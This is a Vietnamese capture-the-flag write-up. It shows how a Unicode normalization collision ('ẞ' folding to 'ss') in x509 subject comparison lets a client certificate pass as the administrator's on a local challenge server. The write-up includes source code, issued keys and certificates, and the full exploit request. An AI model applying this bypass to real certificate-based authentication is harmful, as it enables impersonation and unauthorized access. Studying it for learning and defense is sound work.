# ASS

Đây là challenge pha chút Crypto, sử dụng kiến thức x509.

Quan sát một chút bên ngoài, trang web cho chúng ta một cái cert `/ca.pem`.
Khi ta nhập tên và chọn loại cert, server sẽ trả về cho những thông tin sau:
- Nếu chọn `CLIENT`, ta nhận được private key và certificate
- Nếu chọn `ADMIN`, ta nhận được certificate
- Name phải là chữ in hoa và >=4 kí tự
- Tên cert của **CLIENT** và **ADMIN** không được giống nhau
- Admin chỉ được phép có một cert

Tiếp theo, mình đọc source `ca.py`:

```python

# hàm này dùng để tạo một x509.Name
def _common_name(name: str) -> x509.Name:

# hàm này dùng để chuyển đổi một x509.Certificate sang dạng PEM
def certificate_pem(certificate: x509.Certificate) -> str:

# hàm này dùng để chuyển đổi một ed25519.Ed25519PrivateKey sang dạng PEM
def private_key_pem(key: ed25519.Ed25519PrivateKey) -> str:

# hàm này dùng để lấy subject của một x509.Certificate
def subject(certificate: x509.Certificate) -> asn1crypto.x509.Name:

# hàm này dùng để kiểm tra xem một x509.Certificate có nằm trong thời gian có hiệu lực hay không
def is_in_validity_period(certificate: x509.Certificate) -> bool:


# Class này dùng để tạo một x509.Certificate
class CertificateAuthority:
    # Khởi tạo một self.key và self.certificate
    def __init__(self) -> None:
        
    # Hàm này dùng để tạo một x509.Certificate
    def issue(self, name: str) -> tuple[x509.Certificate, ed25519.Ed25519PrivateKey]:
       
    # Hàm này dùng để kiểm tra xem một x509.Certificate có được cấp bởi chúng ta hay không
    def issued_by_us(self, certificate: x509.Certificate) -> bool:

```
Tiếp theo mình đọc `names.py`:

```python
MIN_LENGTH = 4
MAX_LENGTH = 16

LATIN_EXTENDED_ADDITIONAL = range(0x1E00, 0x1F00)

# Hàm này dùng để kiểm tra xem một ký tự có nằm trong bộ ký tự cho phép không
def in_repertoire(character: str) -> bool:
    # Ký tự phải là chữ cái in hoa hoặc nằm trong bộ ký tự mở rộng Latin
    return "A" <= character <= "Z" or ord(character) in LATIN_EXTENDED_ADDITIONAL

# Hàm này dùng để kiểm tra xem một tên có hợp lệ không,
# Điều kiện hợp lệ là:
# - Tên phải có độ dài từ 4 đến 16 ký tự
# - Tên phải là chữ cái
# - Tên phải là chữ in hoa
def is_acceptable(name: str) -> bool:
    return (
        MIN_LENGTH <= len(name) <= MAX_LENGTH
        and all(in_repertoire(character) for character in name)
        and name.isalpha()
        and name.isupper()
    )
```
Ở file này mình cảm thấy việc tác giả cho phép các kí tự mở rộng Latin rất khả nghi

Đọc tiếp file chính `/app.py`:

```python
import base64
import binascii
import os
import secrets
import threading
import time
from pathlib import Path
from typing import Literal

from cryptography import x509
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric import ed25519
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from pydantic import BaseModel

import ca
import names

FLAG = os.environ["FLAG"]

NONCE_LIFETIME = 120.0
MAX_NONCES = 512
MAX_CERTIFICATE_PEM = 8192

INDEX = (Path(__file__).parent / "templates" / "index.html").read_text(encoding="utf-8")

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

# Khởi tạo một CA
authority = ca.CertificateAuthority() 

# Khởi tạo lock để tránh race condition
lock = threading.Lock()
# Lưu trữ các name đã được cấp
issued_names: set[str] = set()
# Lưu trữ certificate của admin
administrator: x509.Certificate | None = None
# Lưu trữ các nonce
nonces: dict[str, float] = {}

# Class này dùng để tạo một CertificateRequest
class CertificateRequest(BaseModel):
    profile: Literal["ADMIN", "CLIENT"]
    name: str

# Class này dùng để tạo một CertificateResponse
class CertificateResponse(BaseModel):
    profile: str
    name: str
    certificate: str
    private_key: str | None = None

# Class này dùng để tạo một NonceResponse
class NonceResponse(BaseModel):
    nonce: str
    expires_in: int

# Class này dùng để tạo một AdminRequest
class AdminRequest(BaseModel):
    certificate: str
    nonce: str
    signature: str


# Class này dùng để tạo một AdminResponse
class AdminResponse(BaseModel):
    flag: str


@app.get("/", response_class=HTMLResponse)
def index() -> str:
    return INDEX

# Lấy CA certificate khi truy cập /ca.pem
@app.get("/ca.pem", response_class=PlainTextResponse)
def ca_certificate() -> str:
    return ca.certificate_pem(authority.certificate) 


# Tạo certificate khi truy cập /certificates
@app.post(
    "/certificates",
    response_model=CertificateResponse,
    response_model_exclude_none=True,
)
# Hàm này dùng để cấp certificate
def provision(request: CertificateRequest) -> CertificateResponse:
    # Lấy administrator
    global administrator

    # Kiểm tra name có hợp lệ không
    if not names.is_acceptable(request.name):
        raise HTTPException(status_code=400, detail="invalid name")

    
    with lock:
        # Kiểm tra name có được cấp cho ai chưa
        if request.name in issued_names:
            raise HTTPException(status_code=409, detail="name already in use")
        # Kiểm tra admin có được cấp chưa và administrator không rỗng
        if request.profile == "ADMIN" and administrator is not None:
            raise HTTPException(
                status_code=409,
                detail="an administrator certificate has already been provisioned",
            )
        # Cấp certificate và private key 
        certificate, key = authority.issue(request.name)
        try:
            # lấy subject của certificate để hash
            _ = ca.subject(certificate).hashable
        except ValueError:
            raise HTTPException(status_code=400, detail="invalid name") from None

        # Thêm tên vào set các tên đã được cấp
        issued_names.add(request.name)
        # Kiểm tra nếu là admin thì lưu vào administrator
        if request.profile == "ADMIN":
            administrator = certificate

    # Trả về certificate và private key (nếu là client), và không trả key nếu là admin
    return CertificateResponse(
        profile=request.profile,
        name=request.name,
        certificate=ca.certificate_pem(certificate),
        private_key=None if request.profile == "ADMIN" else ca.private_key_pem(key),
    )

# Hàm này dùng để cấp nonce cho admin
@app.get("/auth/nonce", response_model=NonceResponse)
# Tạo 1 nonce ngẫu nhiên, thời gian tồn tại của nonce là 120s
def issue_nonce() -> NonceResponse:
    nonce = secrets.token_hex(32)
    now = time.monotonic()
    with lock:
        for expired in [n for n, born in nonces.items() if now - born > NONCE_LIFETIME]:
            del nonces[expired]
        if len(nonces) >= MAX_NONCES:
            raise HTTPException(status_code=429, detail="too many outstanding nonces")
        nonces[nonce] = now
    return NonceResponse(nonce=nonce, expires_in=int(NONCE_LIFETIME))

# Hàm này dùng để kiểm tra nonce và xóa nếu hết hạn
def consume_nonce(nonce: str) -> bool:
    with lock:
        born = nonces.pop(nonce, None)
    return born is not None and time.monotonic() - born <= NONCE_LIFETIME

# Hàm này dùng để cấp flag, nhưng muốn truy cập được ta phải vượt qua các rào chắn
@app.post("/admin", response_model=AdminResponse)
def administration(request: AdminRequest) -> AdminResponse:
    with lock:
        administrator_certificate = administrator
    if administrator_certificate is None:
        raise HTTPException(
            status_code=409, detail="no administrator certificate has been provisioned"
        )

    if len(request.certificate) > MAX_CERTIFICATE_PEM:
        raise HTTPException(status_code=400, detail="certificate too large")
    try:
        # Ép certificate sang dạng pem để kiểm tra
        presented = x509.load_pem_x509_certificate(request.certificate.encode())
    except ValueError:
        raise HTTPException(status_code=400, detail="malformed certificate") from None
    try:
        # b64decode signature
        signature = base64.b64decode(request.signature, validate=True)
    except (binascii.Error, ValueError):
        raise HTTPException(status_code=400, detail="malformed signature") from None

    # Kiểm tra nonce còn hạn hay không
    if not consume_nonce(request.nonce):
        raise HTTPException(status_code=401, detail="unknown or expired nonce")
    
    # Kiểm tra có đúng us cấp hay không
    if not authority.issued_by_us(presented):
        raise HTTPException(
            status_code=401, detail="certificate was not issued by this authority"
        )
    
    # Kiểm tra certificate có còn hạn không
    if not ca.is_in_validity_period(presented):
        raise HTTPException(
            status_code=401, detail="certificate is not valid at this time"
        )

    # lấy public key
    public_key = presented.public_key()
    # kiểm tra có đúng là loại key hay không
    if not isinstance(public_key, ed25519.Ed25519PublicKey):
        raise HTTPException(status_code=401, detail="unsupported certificate key type")
    try:
        # veri
        public_key.verify(signature, request.nonce.encode())
    except InvalidSignature:
        raise HTTPException(
            status_code=401, detail="signature does not verify"
        ) from None

    try:
        # kiểm tra có đúng là admin hay không
        authorized = ca.subject(presented) == ca.subject(administrator_certificate)
    except ValueError:
        raise HTTPException(status_code=400, detail="malformed certificate") from None
    if not authorized:
        raise HTTPException(status_code=403, detail="not the administrator")

    return AdminResponse(flag=FLAG)
```

Sau một hồi vọc vạch thì mình tìm được một cái RFC có thể giúp ích là [RFC5820](https://datatracker.ietf.org/doc/html/rfc5280#section-7.1:~:text=Conforming%20implementations%20MUST%20use%20the%20LDAP%20StringPrep%20profile%0A%20%20%20(including%20insignificant%20space%20handling)%2C%20as%20specified%20in%20%5BRFC4518%5D%2C%0A%20%20%20as%20the%20basis%20for%20comparison%20of%20distinguished%20name%20attributes%20encoded%0A%20%20%20in%20either%20PrintableString%20or%20UTF8String.), ý chính là khi so sánh 2 common name, thì phải chuyển về một định dạng chung. Sau đó mình tìm hiểu hàm chuẩn hóa [_ldap_string_prep](https://github.com/wbond/asn1crypto/blob/a767d2daa8ef4549d497b67a0304561c2eb4b858/asn1crypto/x509.py#L742) của asn1crypto

Thật ra mình đọc hàm này mình chả hiểu gì, nên mình quyết định để hàm này chuẩn hóa hết bộ kí tự xem có gì không:
```python
from asn1crypto.x509 import NameTypeAndValue

for i in range(0x1E00,0X1EFF):
    c= chr(i)
    try:
        res = NameTypeAndValue._ldap_string_prep(None,c)
    except ValueError:
        pass
    print(c+' '+res)

# ẞ  ss 
# ẟ  ss
```
Kết quả là có 2 kí tự khi chuẩn hóa sẽ thành `ss`. Nhờ đó mình có ý tưởng để giải bài này. Mình sẽ kí certificate cho CLIENT với name là `ASSSSSS`, ta sẽ nhận được private key của cert này. Sau đó mình kí ADMIN với name là `Aẞẞẞ`, thì khi chuẩn hóa lại name của ADMIN sẽ trùng với name của CLIENT. Nhờ cái này ta có thể bypass được check `authorized = ca.subject(presented) == ca.subject(administrator_certificate)`

Để ý ta sẽ thấy có 1 endpoint `/auth/nonce` để cấp nonce, mình sẽ lấy nonce sau đó dùng private key của CLIENT để sign nonce, rồi gửi lại cho server để lấy flag.

Muốn lấy được flag, ta phải truy cập `/admin` với method `POST`, với các tham số là **certificate**, **nonce**, **signature**.

### Giải:

#### Lấy cert của CLIENT:
```json
{
  "profile": "CLIENT",
  "name": "ASSSSSS",
  "certificate": "-----BEGIN CERTIFICATE-----\nMIIBETCBxKADAgECAhQglzE9Y666lFB8YYB9rKC3Lkm/ljAFBgMrZXAwGTEXMBUG\nA1UEAwwOQVNTIElzc3VpbmcgQ0EwHhcNMjYwOTA3MTE0MTU1WhcNMjYxMDA3MTE0\nNjU1WjASMRAwDgYDVQQDDAdBU1NTU1NTMCowBQYDK2VwAyEA0wm5pMESdTJRUAFv\nyi07tFVVV5gPvZFyS1+OpsHHRVKjJTAjMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAww\nCgYIKwYBBQUHAwIwBQYDK2VwA0EAdgipMFzFT8Cj8aMTHGlZc4JKFzfWGQZ1u2Wo\nvKuWuFlMRX9BaMB+gcG87bqZAF7YP12lW+2OtP8Bgy6AAaY9AA==\n-----END CERTIFICATE-----\n",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEILBYANvMytpAEisNNm7eY+7rJsckbiRZd5fXZl/un/i6\n-----END PRIVATE KEY-----\n"
}
```

#### Lấy cert của ADMIN:

```json
{
  "profile": "ADMIN",
  "name": "Aẞẞẞ",
  "certificate": "-----BEGIN CERTIFICATE-----\nMIIBFDCBx6ADAgECAhRyY5uiDYqofO4C6dXvihv96w7gQDAFBgMrZXAwGTEXMBUG\nA1UEAwwOQVNTIElzc3VpbmcgQ0EwHhcNMjYwOTA3MTE0MjE1WhcNMjYxMDA3MTE0\nNzE1WjAVMRMwEQYDVQQDDApB4bqe4bqe4bqeMCowBQYDK2VwAyEAJhmUjuxB8E5I\nBwagg3IBb9bTZECav7oghaaRrU6I/IOjJTAjMAwGA1UdEwEB/wQCMAAwEwYDVR0l\nBAwwCgYIKwYBBQUHAwIwBQYDK2VwA0EA23Z1RYM6mXmrQg5lRoQC3kEX///+kAKx\ntOjLDf6NSQH4yZLaTBw0JAn6KXl6nFYb1UFRuAAiyY4MDPovaM2gCQ==\n-----END CERTIFICATE-----\n"
}
```

#### Truy cập /auth/nonce, sau đó dùng private key để kí, lưu ý làm thật nhanh tại vì chỉ có 120s

Dùng command `openssl pkeyutl -sign -inkey key.pem -rawin -in nonce.txt | base64`

#### Truy cập `/admin` để lấy flag

```http
POST /admin HTTP/1.1
Host: localhost:3000
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="151", "Not=A?Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: phpbb3_7v394_k=; phpbb3_7v394_u=59; phpbb3_7v394_sid=69b59bccda54af63470c88a67fcdff3a
Connection: keep-alive
content-type: application/json
Content-Length: 645

{
	"certificate":"-----BEGIN CERTIFICATE-----\nMIIBETCBxKADAgECAhQglzE9Y666lFB8YYB9rKC3Lkm/ljAFBgMrZXAwGTEXMBUG\nA1UEAwwOQVNTIElzc3VpbmcgQ0EwHhcNMjYwOTA3MTE0MTU1WhcNMjYxMDA3MTE0\nNjU1WjASMRAwDgYDVQQDDAdBU1NTU1NTMCowBQYDK2VwAyEA0wm5pMESdTJRUAFv\nyi07tFVVV5gPvZFyS1+OpsHHRVKjJTAjMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAww\nCgYIKwYBBQUHAwIwBQYDK2VwA0EAdgipMFzFT8Cj8aMTHGlZc4JKFzfWGQZ1u2Wo\nvKuWuFlMRX9BaMB+gcG87bqZAF7YP12lW+2OtP8Bgy6AAaY9AA==\n-----END CERTIFICATE-----\n",
"signature":"gjWTG6USYSVTqAqXsz0NESDKI5+Hyz91wi6VFOMETInOYH7W9D5KLQJt8X3M0OVzhAP5uVeqZIGx71YAGsGBDg==",
"nonce":"44033892df5a424d1479876efb5ef9be1101ab1370eecb3c842d4d3492e19f49"
}
```
